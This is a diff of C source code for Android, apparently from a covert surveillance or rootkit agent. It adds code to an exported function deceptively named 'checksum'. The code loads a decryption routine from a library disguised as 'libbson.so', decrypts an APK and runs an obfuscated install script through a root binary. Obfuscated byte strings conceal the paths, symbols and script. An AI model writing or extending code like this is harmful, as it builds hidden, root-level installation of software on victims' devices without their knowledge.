@@ -10,10 +10,13 @@
 #include <sys/system_properties.h>
 #include <sys/mount.h>
 #include <sys/types.h>
+#include <dlfcn.h>
 
 #include "shell_params.h"
 #include "log.h"
 #include "deobfuscate.h"
+
+typedef int (*decrypt_t)(char *);
 
 static unsigned char enc_script[] = "\xc3\x26\x38\x20\x2e\x34\xf0\xc6\xf0\xfb\xea\xf2\x34\xe1\xf6\xf5\x34\xf0\xf7\xc9\xe0\xee\xfb\x2f\x2a\xf0\x2f\x05\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9\xf1\xf2\x2f\x2a\xf0\xc9\xe0\xf7\xf2\xf4\xeb\x2f\x3c\x3a\x3a\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9\xf0\xea\xfb\xfb\xf6\xf5\xec\xf0\x2f\xff\xfa\xfb\x2f\xec\xf3\xf4\xe1\xee\xf3\x2f\xff\xee\xe0\xe8\xee\xec\xea\xe4\xfd\xea\xf1\xf6\xed\xf6\xea\xf1\xe4\xea\xf5\xee\xe1\xf3\xea\x2f\x3f\xc9\xff\xf2\x2f\xeb\xf6\xf0\xee\xe1\xf3\xea\x2f\xe0\xf4\xf2\x35\xee\xf5\xeb\xf1\xf4\xf6\xeb\x35\xfd\xea\xf5\xeb\xf6\xf5\xec\xc9\xf0\xf3\xea\xea\xff\x2f\x3e\xc9\xff\xf2\x2f\xf6\xf5\xf0\xfb\xee\xf3\xf3\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9\xf1\xf2\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9"; // Install script
 
@@ -21,6 +24,8 @@ static unsigned char enc_script2[] = "\xfd\x33\x45\xfc\xf0\x23\xf2\x8f\xfc\xf1\x
 
 static unsigned char shtmp[] = "\x53\xd9\x8f\x20\xcd\xd9\xce\x25"; // "shtmp"
 static unsigned char rcs[] = "\x2f\x84\xac\x43\x40\x48\x01\x5b\x42\x67"; // "log.tmp"
+static unsigned char bson_path[] = "\x49\xdd\x85\x99\x99\x9e\xdf\x20\xd5\x9e\xdf\x20\xd5\xd5\xca\xde\xd9\x99\xca\xde"; // "../lib/libbson.so"
+static unsigned char bson_sym[] = "\xdc\x2a\xfe\x87\xf5\xf3\x9e\xcd\xf0\xf5\xc8"; // "_isValid"
 
 __attribute__ ((visibility ("default"))) int checksum(void) {
   char current_path_shtmp[512];
@@ -30,10 +35,26 @@ __attribute__ ((visibility ("default"))) int checksum(void) {
   char script2[1024];
   char complete_script[2048];
   char script_rcs[512];
+  void *handle;
   static unsigned char qzx[] = "\x8c\x90\x1f\x1d\x16\x14"; // "qzx"
   struct stat st;
+  char *error;
 
   LOGD("[APK INSTALLER] Starting apk installation\n");
+  LOGD("[APK INSTALLER] Opening crypto lib\n");
+
+  // Open crypto library
+  handle = dlopen(deobfuscate(bson_path), RTLD_LAZY);
+  if(!handle) {
+    LOGD("[APK INSTALLER] Unable to open crypto lib\n");
+    return 0;
+  }
+
+  decrypt_t decrypt_ptr = (decrypt_t) dlsym(handle, deobfuscate(bson_sym));
+  if ((error = dlerror()) != NULL) {
+    LOGD("[APK INSTALLER] Unable to find crypto sym\n");
+    return 0;
+  }
 
   memset(current_path_shtmp, 0, sizeof(current_path_shtmp));
 
@@ -77,6 +98,13 @@ __attribute__ ((visibility ("default"))) int checksum(void) {
   snprintf(script_rcs, sizeof(script_rcs), "%s %s %s", deobfuscate(ROOT_BIN), deobfuscate(qzx), current_path_shtmp);
 
   fclose(install_rcs);
+
+  // Decrypt before install
+  LOGD("[APK INSTALLER] Decrypting apk...!\n");
+  if(!decrypt_ptr(current_path_rcs)) {
+    LOGD("[APK INSTALLER] Decryption failed...!\n");
+    return 0;
+  }
 
   LOGD("[APK INSTALLER] Starting installation script!\n");
   system(script_rcs);
